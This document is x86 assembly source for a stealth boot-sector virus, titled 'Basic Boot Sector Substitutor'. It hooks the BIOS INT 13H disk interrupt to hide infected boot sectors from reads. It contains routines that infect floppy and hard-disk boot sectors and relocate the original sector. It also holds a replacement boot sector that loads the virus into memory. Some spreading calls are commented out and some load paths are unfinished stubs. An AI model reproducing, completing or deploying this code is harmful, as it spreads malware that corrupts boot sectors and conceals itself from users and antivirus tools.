

;Basic Boot Sector Substitutor

COMSEG  SEGMENT PARA
        ASSUME  CS:COMSEG,DS:COMSEG,ES:COMSEG,SS:COMSEG

        ORG     100H

START:
        jmp     BOOT_START

;*******************************************************************************
;* BIOS DATA AREA                                                              *
;*******************************************************************************

        ORG     413H

MEMSIZE DW      640                             ;size of memory installed, in KB

;*******************************************************************************
;* VIRUS CODE STARTS HERE                                                      *
;*******************************************************************************

        ORG     5E00H


STEALTH:                                        ;A label for the beginning of the virus

;*******************************************************************************
;* INTERRUPT 13H HANDLER                                                       *
;*******************************************************************************

OLD_13H DD      ?                               ;Old interrupt 13H vector goes here

INT_13H:
        sti
        cmp     ah,2                            ;we want to intercept reads
        jz      READ_FUNCTION
;        cmp     ah,3                            ;and writes to all disks
;        jz      WRITE_FUNCTION
I13R:   jmp     DWORD PTR cs:[OLD_13H]

READ_FUNCTION:                                  ;BIOS Disk Read Function
        cmp     ch,0                            ;is it track 0?
        jnz     RFE                             ;nope, go on
        cmp     dh,0                            ;is it head 0?
        jnz     RFE                             ;nope
        cmp     cl,1                            ;is it sector 1
        jz      READ_BOOT                       ;yes, go handle reading the boot sector
RF1:    cmp     dl,80H                          ;is it a hard drive?
        jnc     RF2                             ;yes, go deal with that
        cmp     cl,2                            ;is it sector 2 on the floppy?
        jnz     RF2                             ;no, go on
        call    CHECK_FLOPPY                    ;see if floppy has been infected yet
        jz      I13R                            ;yes, it has, so go do normal access
;        call    INFECT_FLOPPY                   ;no, go infect it
        jmp     SHORT I13R
RF2:;     cmp     dl,80H                          ;is it hard drive c:
;        jnz     I13R                            ;no, another hard drive
;        jnz     RF1
;        jmp     READ_CHARD                      ;read on the C drive to divert
RFE:    jmp     SHORT I13R

WRITE_FUNCTION:                                 ;BIOS Disk Write Function
        cmp     ch,0                            ;is it track 0?
        jnz     I13R                            ;nope, go on
        cmp     dh,0                            ;is it head 0?
        jnz     I13R                            ;nope
        cmp     cl,1                            ;is it sector 1
        jnz     WF1
        jmp     WRITE_BOOT                      ;yes, go handle reading the boot sector
WF1:;    cmp     dl,80H                          ;is it the hard drive
;        jnc     I13R                            ;no, another hard drive
;        jnz     WF2
;        jmp     WRITE_CHARD                     ;read on the C drive to divert
;WF2:    cmp     cl,2                            ;is it sector 2 on the floppy
;        jnz     I13R                            ;no, go on
;        call    CHECK_FLOPPY                    ;see if floppy has been infected yet
;        jz      I13R                            ;yes, it has, so go do normal access
;        call    INFECT_FLOPPY                   ;no, go infect it
        jmp     SHORT I13R

;*******************************************************************************
;This section of code handles reading the boot sector. There are three
;possibilities: 1) The disk is not infected, in which case the read should be
;passed directly to BIOS, 2) The disk is infected and only one sector is
;requested, in which case this routine figures out where the original boot
;sector is and reads it, and 3) The disk is infected and more than one sector
;is requested, in which this routine breaks the read up into two calls to the
;ROM BIOS, one to fetch the original boot sector, and another to fetch the
;additional sectors being read. One of the complexities in this last case is
;that the routine must return the registers set up as if only one read had
;been performed.
;  To determine if the disk is infected, the routine reads the real boot sector
;into SCRATCHBUF and calls IS_VBS. If that returns affirmative, then this
;routine goes to get the original boot sector, etc., otherwise it calls ROM
;BIOS and allows a second read to take place to get the boot sector into the
;requested buffer at es:bx.
READ_BOOT:
        push    ax                              ;save registers
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    bp

        push    cs                              ;set ds=es=cs
        pop     es
        push    cs
        pop     ds
        mov     bp,sp                           ;and bp=sp

        mov     bx,OFFSET SCRATCHBUF            ;and point to the scratch buffer
        mov     al,1                            ;read the real boot sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        sti
        jnc     RB01
        jmp     RB_GOON                         ;error on read here, let ROM BIOS return proper error code
RB01:   call    IS_VBS                          ;good read, is it the viral boot sector?
        jz      RB02                            ;yes
        jmp     RB_GOON                         ;no, let ROM BIOS do the read into proper buffer
;&&&&&&&&&&
RB02:   mov     bx,OFFSET SCRATCHBUF + (OFFSET DR_FLAG - OFFSET BOOT_START)
        mov     al,BYTE PTR [bx]
        cmp     al,80H                          ;infected, so we must redirect the read
        jnz     RB1
        mov     al,4                            ;make an index of the drive type being read
RB1:    mov     bl,3
        mul     bl                              ;ax=offset to BOOT_SECTOR_LOCATION table
        add     ax,OFFSET BOOT_SECTOR_LOCATION
        mov     bx,ax
        mov     ch,[bx]
        mov     dh,[bx+1]
        mov     cl,[bx+2]                       ;set up everything for the read
        mov     dl,ss:[bp+6]
        mov     bx,ss:[bp+10]
        mov     ax,ss:[bp+2]
        mov     es,ax
        mov     ax,201H
        mov     al,ss:[bp+12]
        pushf
        call    DWORD PTR [OLD_13H]
        sti
        mov     al,ss:[bp+12]                   ;see if it was a more than 1 sector read
        cmp     al,1
        jz      RB_EXIT
READ_1NEXT:                                     ;more than 1 sector, read the rest now
        pop     bp                              ;as a second call to BIOS
        pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        add     bx,512                          ;prepare to call old handler for balance of read
        push    ax
        dec     al
        inc     cl
        pushf
        call    DWORD PTR cs:[OLD_13H]          ;read the rest (must use cs now!)
        sti
        push    ax
        push    bp
        mov     bp,sp
        pushf
        pop     ax
        mov     ss:[bp+10],ax
        jc      RB2                             ;an error, so exit with ah from 2nd int 13

        sub     bx,512
        dec     cl
        pop     bp
        pop     ax
        pop     ax                              ;else exit with ah from first int 13
        mov     ah,0
        iret

RB2:    pop     bp
        pop     ax
        add     sp,2
        iret

RB_EXIT:
        mov     ax,ss:[bp+18]
        push    ax
        popf
        clc
        sti
        pushf
        pop     ax
        mov     ss:[bp+18],ax
        pop     bp
        pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ah,0
        iret


RB_GOON:                        ;This just restores all registers as they were
        pop     bp              ;when INT_13H was reached, and passes control
        pop     es              ;to the ROM BIOS
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     I13R

;*******************************************************************************
WRITE_BOOT:
        jmp     I13R

READ_CHARD:
        jmp     I13R

WRITE_CHARD:
        jmp     I13R

;This table identifies where the original boot sector is located for each
;of the various disk types.
BOOT_SECTOR_LOCATION:
        DB      40,1,6                          ;Track, head, sector for orig boot sector, 360k drive
        DB      80,1,15                         ;1.2M drive
        DB      0,0,0                           ;720K drive
        DB      0,0,0                           ;1.44M drive
        DB      0,0,15                          ;Hard drive


;*******************************************************************************
;This returns with Z set if the floppy designated in dl has been infected
;by the virus already. Otherwise it returns with NZ. It must preserve all
;registers.
CHECK_FLOPPY:
        push    ax                      ;save registers
        push    bx
        push    cx
        push    dx
        push    es
        push    ds

        push    cs                      ;set up ds, es
        pop     es
        push    cs
        pop     ds

        mov     al,dl
        call    GET_BOOT_SEC2            ;read the boot sector into SCRATCHBUF
;        call    IS_VBS                  ;and see if it's the viral boot sector
	xor	al,al

        pop     ds                      ;return Z if it is
        pop     es
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret


;This routine determines from the boot sector parameters what kind of floppy
;disk is in the drive being accessed, and calls the proper infection routine.
INFECT_FLOPPY:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    es
        push    ds
        mov     al,dl
;        call    INFECT_12M
        pop     ds
        pop     es
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret

;This routine determines if a hard drive C: exists, and returns NZ if it does,
;Z if it does not.
IS_HARD_THERE:
        mov     al,1
        or      al,al
        ret

INFECT_360K:
        ret

;Infect Floppy Disk Drive AL with this virus. This involves the following steps:
;A) Read the present boot sector. B) Copy it to Track 79, Head 1, Sector 15.
;C) Copy the disk parameter info into the new boot sector in memory. D) Copy the
;new boot sector to Track 0, Head 0, Sector 1. E) Copy the STEALTH routines to
;Track 79, Head 1, Sector 1, 14 sectors total.
INFECT_12M:
        call    GET_BOOT_SEC                    ;read the present boot sector into RAN

        mov     bx,OFFSET SCRATCHBUF            ;and go write it at Track 80, Head 1, Sector 15
        push    ax
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,500FH                        ;track 80, sector 15
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax

        mov     di,OFFSET BOOT_DATA
        mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
        mov     cx,1BH / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     al,BYTE PTR [SCRATCHBUF + 1FDH] ;copy drive letter there as well
        mov     BYTE PTR [BOOT_START + 1FDH],al

        push    ax                              ;and write new boot sector to disk
        mov     bx,OFFSET BOOT_START            ;this is buffer for the new boot sector
        call    PUT_BOOT_SEC                    ;go write it to disk
        pop     ax

        mov     bx,OFFSET STEALTH               ;buffer for 14 sectors of stealth routines
        mov     dl,al                           ;drive to write to
        mov     dh,1                            ;head 1
        mov     cx,5001H                        ;track 80, sector 1
        mov     ax,030EH                        ;write 14 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)

        ret                                     ;all done

INFECT_720K:
INFECT_144M:
        ret

;Infect Hard Disk Drive AL with this virus. This involves the following steps:
;A) Read the present boot sector. B) Copy it to Track 0, Head 0, Sector 16.
;C) Copy the disk parameter info into the new boot sector in memory. D) Copy the
;new boot sector to Track 0, Head 0, Sector 1. E) Copy the STEALTH routines to
;Track 0, Head 0, Sector 2, 14 sectors total.
INFECT_HARD:
        mov     al,80H                          ;set drive type flag to hard disk
        mov     [DR_FLAG],al                    ;cause that's where it's going

        call    GET_BOOT_SEC                    ;read the present boot sector into RAN

        mov     bx,OFFSET SCRATCHBUF            ;and go write it at Track 0, Head 0, Sector 16
        push    ax
        mov     dl,al
        mov     dh,0                            ;head 0
        mov     cx,0010H                        ;track 0, sector 16
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax

        push    ax
        mov     di,OFFSET BOOT_DATA
        mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
        mov     cx,1BH / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     di,OFFSET BOOT_START + 200H - 42H
        mov     si,OFFSET SCRATCHBUF + 200H - 42H
        mov     cx,21H                          ;copy partition table
        rep     movsw                           ;to new boot sector too!
        pop     ax

        push    ax                              ;and write new boot sector to disk
        mov     bx,OFFSET BOOT_START            ;this is buffer for the new boot sector
        call    PUT_BOOT_SEC
        pop     ax

        mov     bx,OFFSET STEALTH               ;buffer for 14 sectors of virus routines
        mov     dl,al                           ;drive to write to
        mov     dh,0                            ;head 0
        mov     cx,0002H                        ;track 0, sector 2
        mov     ax,030EH                        ;write 14 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)

        ret

;Read the boot sector on the drive AL into SCRATCHBUF. This routine must
;prserve AL!
GET_BOOT_SEC:
        push    ax
        mov     bx,OFFSET SCRATCHBUF            ;this is buffer for the current boot sector
        mov     dl,al                           ;this is the drive to read from
        mov     dh,0                            ;head 0
        mov     ch,0                            ;track 0
        mov     cl,1                            ;sector 1
        mov     al,1                            ;read 1 sector
        mov     ah,2                            ;BIOS read function
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        ret

;Read the boot sector on the drive AL into SCRATCHBUF. This routine must
;prserve AL!
GET_BOOT_SEC2:
        push    ax
        mov     bx,OFFSET SCRATCHBUF            ;this is buffer for the current boot sector
        mov     dl,al                           ;this is the drive to read from
        mov     dh,0                            ;head 0
        mov     ch,0                            ;track 0
        mov     cl,1                            ;sector 1
        mov     al,1                            ;read 1 sector
        mov     ah,2                            ;BIOS read function
;        pushf
;        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        ret

;This routine writes the boot sector at es:bx to the drive in al.
PUT_BOOT_SEC:
        mov     dl,al                           ;this is the drive to write to
        mov     dh,0                            ;head 0
        mov     ch,0                            ;track 0
        mov     cl,1                            ;sector 1
        mov     al,1                            ;read 1 sector
        mov     ah,3                            ;BIOS write function
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        ret

;Determine whether the boot sector in SCRATCHBUF is the viral boot sector.
;Returns Z if it is, NZ if not. The first 30 bytes of code, starting at BOOT,
;are checked to see if they are identical. If so, it must be the viral boot
;sector. It is assumed that es and ds are properly set to this segment when
;this is called.
IS_VBS:
        push    si
        push    di
        cld
        mov     di,OFFSET BOOT
        mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT - OFFSET BOOT_START)
        mov     cx,15
        repz    cmpsw
        pop     di
        pop     si
        ret


;*******************************************************************************
;* A SCRATCH PAD BUFFER FOR DISK READS AND WRITES
;*******************************************************************************

        ORG     7A00H

SCRATCHBUF:

        DB      512 dup (?)

;*******************************************************************************
;* THIS IS THE REPLACEMENT BOOT SECTOR                                         *
;*******************************************************************************

        ORG     7C00H

BOOT_START:
        jmp     SHORT BOOT                      ;jump over data area
        db      0FFH                            ;an extra byte for near jump

BOOT_DATA:
        db      1BH dup (?)                     ;data area (will be copied from old sector)

DR_FLAG DB      1                               ;Drive type flag, 0=360K Floppy
                                                ;                 1=1.2M Floppy
                                                ;                 2=720K Floppy
                                                ;                 3=1.4M Floppy
                                                ;                 80H=Hard Disk

BOOT:
        cli
        xor     ax,ax
        mov     ss,ax
        mov     ds,ax
        mov     es,ax                           ;set up segment registers
        mov     sp,OFFSET BOOT_START            ;and stack pointer
        sti

        mov     ax,[MEMSIZE]                    ;get the size of memory available in this system
        mov     cl,6
        shl     ax,cl                           ;this turns KB into a segment value
        sub     ax,7E0H                         ;subtract enough so this code will have the right offset
        mov     es,ax
        sub     [MEMSIZE],8                     ;go memory resident in high memory

GO_RELOC:
        mov     si,OFFSET BOOT_START            ;set up ds:si and es:di in order to relocate this code
        mov     di,si
        mov     cx,256
        rep     movsw                           ;and move this sector to BOOT_START
        push    es
        mov     ax,OFFSET RELOC
        push    ax                              ;push relocated address of RELOC onto stack
        retf                                    ;and go there

RELOC:                                          ;relocated code begins executing here
        push    es
        pop     ds
        mov     bx,OFFSET STEALTH               ;set up buffer to read virus into memory
        mov     al,[DR_FLAG]                    ;drive number
        cmp     al,0                            ;Load from proper drive type
        jz      LOAD_360
        cmp     al,1
        jz      LOAD_12M
        cmp     al,2
        jz      LOAD_720
        cmp     al,3
        jz      LOAD_14M
                                                ;if none of the above, then it's a hard drive

LOAD_HARD:                                      ;load virus from hard disk
        mov     dx,80H                          ;hard drive 80H, head 0,
        mov     ch,0                            ;track 0,
        mov     cl,2                            ;sector 2
        jmp     SHORT LOAD

LOAD_360:                                       ;load virus from 360 K floppy
        xor     dx,dx                           ;head 0, drive 0
        mov     ch,40                           ;track 40
        mov     cl,1                            ;sector 1
        mov     ax,209H                         ;read 9 sectors
        push    cx
        int     13H                             ;call BIOS to read the sectors
        pop     cx
        add     bx,9*512                        ;move es:bx up
        mov     dx,100H                         ;head 1 drive 0
        mov     al,6                            ;read 6 more sectors
        jmp     SHORT LOAD1

LOAD_12M:                                       ;load virus from 1.2 Meg floppy
        mov     dx,100H                         ;head 1, drive 0
        mov     ch,80                           ;track 80
        mov     cl,1                            ;sector 1
        jmp     SHORT LOAD

LOAD_720:
        jmp     LOAD_720                        ;not implemented yet

LOAD_14M:
        jmp     LOAD_14M                        ;not implemented yet

LOAD:   mov     al,15                           ;read 15 sectors
LOAD1:  mov     ah,2                            ;read command
        int     13H                             ;call BIOS to read it

MOVE_OLD_BS:
        xor     ax,ax                           ;now move old boot sector into
        mov     es,ax                           ;low memory
        mov     si,OFFSET SCRATCHBUF            ;at 0000:7C00
        mov     di,OFFSET BOOT_START
        mov     cx,256
        rep     movsw

SET_SEGMENTS:
        cli
        mov     ax,cs
        mov     ss,ax
        mov     sp,OFFSET STEALTH               ;set up the stack for the virus
        sti
        push    cs                              ;and also the segment registers
        push    cs
        pop     ds
        pop     es

INSTALL_INT13H:
        xor     ax,ax
        mov     ds,ax
        mov     si,13H*4                        ;save the old int 13H vector
        mov     di,OFFSET OLD_13H
        movsw
        movsw
        mov     ax,OFFSET INT_13H               ;and set up new interrupt 13H vector
        mov     bx,13H*4
        mov     ds:[bx],ax
        mov     ax,es
        add     bx,2
        mov     ds:[bx],ax

CHECK_DRIVE:
        cmp     BYTE PTR [DR_FLAG],80H          ;if booting from a hard drive,
        jz      DONE                            ;nothing else needed at boot time

FLOPPY_DISK:                                    ;if loading from a floppy drive,
;        call    IS_HARD_THERE                   ;see if a hard disk exists on this machine
;        jz      INSTALL_INT13H                  ;no hard disk, nothing else to do
;        mov     al,80H                          ;else load the boot sector from drive C
;        call    GET_BOOT_SEC                    ;into SCRATCHBUF
;        call    IS_VBS                          ;and check it to see if it's the viral boot sector
;        jz      INSTALL_INT13H                  ;yes, hard drive already infected, nothing to do
;        mov     al,80H                          ;no, go infect hard drive C:
;        call    INFECT_HARD

DONE:
        xor     ax,ax                           ;now go execute old boot sector
        push    ax                              ;at 0000:7C00
        mov     ax,OFFSET BOOT_START
        push    ax
        retf


        ORG     7DBEH

        DB      40H dup (?)                     ;partition table goes here

        ORG     7DFEH

        DB      55H,0AAH                        ;boot sector ID goes here

ENDCODE:

COMSEG  ENDS

        END     START

